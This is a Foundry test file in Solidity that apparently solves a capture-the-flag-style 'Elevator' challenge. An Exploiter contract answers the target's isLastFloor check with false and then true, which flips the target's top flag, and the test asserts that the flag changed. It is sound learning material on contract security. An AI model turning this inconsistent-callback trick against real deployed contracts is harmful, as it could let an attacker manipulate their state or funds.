pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "forge-std/console2.sol";

import "src/12.sol";

contract Exploiter {

    address owner;
    bool called = false;

    constructor() {
    }

    function exploit(Elevator instance) external {
        instance.goTo(666);
    }

    function isLastFloor(uint) external returns (bool) {
        if(called) {
            return true;
        }
        called = true;
        return false;
    }
}

contract Test12 is Test {

    Elevator instance;
    
    function setUp() public {
        instance = new Elevator();
    }

    function testSolve() public {
        Exploiter exploiter = new Exploiter();
        
        console.log("Current Floor: ", instance.floor());
        console.log("Is Top Floor: ", instance.top());

        exploiter.exploit(instance);

        console.log("");

        console.log("Current Floor: ", instance.floor());
        console.log("Is Top Floor: ", instance.top());

        assertTrue(instance.top());
        
    }

}